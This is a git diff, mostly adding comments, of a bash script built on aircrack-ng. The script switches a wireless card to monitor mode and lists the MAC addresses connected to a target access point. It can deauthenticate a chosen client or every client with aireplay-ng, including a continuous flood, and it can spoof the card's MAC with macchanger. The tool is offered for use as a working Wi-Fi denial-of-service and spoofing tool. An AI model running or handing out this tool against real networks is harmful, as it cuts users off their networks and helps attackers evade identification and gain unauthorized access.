@@ -1,55 +1,55 @@
 #!/usr/bin/env bash
 
-
+# all the  pachages needed in the script
 packgeNeeded=("aircrack-ng" "iw" "wireless-tools" "network-manager" "macchanger" )
 
 # echo help if no arguments were given 
 if [ $# -eq 0 ]
 then
-    echo -e "-e for wifi essid\n-b for wifi bssid\n-h for help\n-l list wifi"
+    echo -e "-h for help"
 fi
 
 # Get arguments 
 # reset True > disable monitor mode befor exit
-# r and l without : coz thir is no input 
+# r and l without : coz thir is no expected input 
 while getopts "b:e:vharl:c:t:d:i:m:A" option ; 
 do
     case $option in
         e) # set wiff essid
             wifiEssid=$OPTARG;;
-        b)
+        b) # set wiff bssid 
             wifiBssid=$OPTARG;;
-        r)
+        r) # to disable monitor mode befor exit
             reset=True;;
-        h)
+        h) # Display help
             echo -e "-e for wifi essid\n-b for wifi bssid\n-r disable monitor mode\n-l list wifi\n-c target mac address\n-t check if mac is online\n-i interface name\n[Mac] only mac for mac vendore\n-m [mac]  -i [interface] change mac\n-A -i [interface]reset mac "
             exit ;;
-        l)
+        l) # display wifi scan - to know the bssid for the acess point
             nmcli device wifi list ifname $OPTARG || echo -e "\n-l interface name "
             exit
             ;;
-        c)
+        c) # set the target mac address
             targetMac=$OPTARG
             ;;
-        a)
+        a) # if you want to kick all the devices in the network
             Kickall=True
             ;;
-        t)
+        t) # set mac address to see if it's online or not
             checkTarget=$OPTARG
             ;;
-        v)
+        v) # display all the mac address vendore
             allVendor=True
             ;;
-        d)
+        d) # how much deauthentication attack packets to send
             numberOfKickPackets=$OPTARG
             ;;
-        i)
+        i) # set the interface name 
             interfaceName=$OPTARG
             ;;
-        m)
+        m) # set mac to spoof
             newMac=$OPTARG
             ;;
-        A)
+        A) # reset the orignal mac address
             resetMac=True
             ;;
         \?) # unexpected arguments 
@@ -60,7 +60,7 @@ done
 
 # ================================= Functions ================================= #
 
-# check for used packages
+# check if all used packages are installed
 # dpkg -s $1 &> /dev/null [ $? -eq 0 ]  0 > installed , 1 > not installed
 
 function installAllPackages(){
@@ -72,6 +72,7 @@ function installAllPackages(){
 
 # start monitor mode 
 function startMonitorMode {
+    # check for interface name 
     if [ ! -z $interfaceName ]
     then
         interface=$interfaceName
@@ -79,6 +80,7 @@ function startMonitorMode {
         # get the current interface name
         interface=$(iw dev | grep Interface |cut -d " " -f2)
     fi
+
     # Check if monitor mode is on 
     interfaceMode=$(iwconfig $interface |grep -o Monitor)
     # if $interfaceMode is not empty > return interface name else start monitor mode
@@ -126,19 +128,23 @@ function resetMode(){
 # Get mac list 
 function GetMacList() {
     # start monitor mode and return the name of the interface
-    #interfacee=$(startMonitorMode)
+    # interfacee=$(startMonitorMode)
     echo $interface is on Monitor Mode
+    
+    # $1 is the target bssid -d [Mac]
     sudo airodump-ng $1 -i $interface --output-format csv -w temp
     echo -e "\n------------------- Results ---------------------\n"
-    # grep the devices mac
+    # grep the devices mac if check target only check for one mac else display all connected mac
     if [ ! -z $checkTarget ]
     then
         if grep -q "$2" temp-01.csv ; then echo -e "\n$2 is online" ; else echo not found; fi
         sudo rm -f temp*
     else
         cat temp-01.csv | cut -d , -f 1 > result
+        # display all mac address vendors
         if [ ! -z $allVendor ]
         then
+            # loop through all mac regex
             for i in $(grep "^..:" result)
             do 
                 macVendore=$(deviceVendore $i)
@@ -156,6 +162,7 @@ function GetMacList() {
 
 # Kick user by mac address
 function kickUser(){
+    # $1 for bssid - $2 for interfacename 
     if [ $Kickall ]
     then
         sudo aireplay-ng --deauth 0 -a $1 $2
@@ -169,8 +176,10 @@ function kickUser(){
 }
 
 function deviceVendore(){
+    # changeing the mac format form ..:.. to ..-..
     mac=$(echo $1 | tr ":" "-")
     mac=${mac:0:8}
+    # if the vendore database exist search for mac in it else download it from github
     if [ -f vendor.txt ]; then
         grep -i $mac vendor.txt |cut -f 3
     else
@@ -184,13 +193,14 @@ function deviceVendore(){
 
 
 function spoofMac(){
+    # set new mac address only if interface name and new mac is given
     if [ ! -z $1 ] && [ ! -z $2 ]
     then
         echo "Spoof Mac to $1"
         sudo ifconfig $2 down
         sudo macchanger -m $1 $2
         sudo ifconfig $2 up
-    elif [ -z $1 ] && [ -z $2 ]
+    elif [ -z $1 ] && [ -z $2 ] #reset the mac address if no given arguments
     then
         echo "Reset Mac to orignal"
         sudo macchanger -p $interfaceName
@@ -203,8 +213,9 @@ function spoofMac(){
 dpkg -s ${packgeNeeded[@]} > /dev/null 2>&1 || installAllPackages 
 
 
+# ================================= Main ================================= #
 
-# if the bessid is given 
+# if the only bessid is given 
 if [ ! -z $wifiBssid ] && [ -z $targetMac ] && [ -z $Kickall ] && [ -z $checkTarget ]
 then
     interface=$(startMonitorMode)
@@ -238,6 +249,7 @@ then
     spoofMac $newMac $interfaceName
 else
     #echo -e "You Must Give Essid or bssid \n"
+    # if only mac is given show the vendore of it
     if [[ $1 =~ ":" ]]
     then
         deviceVendore $1
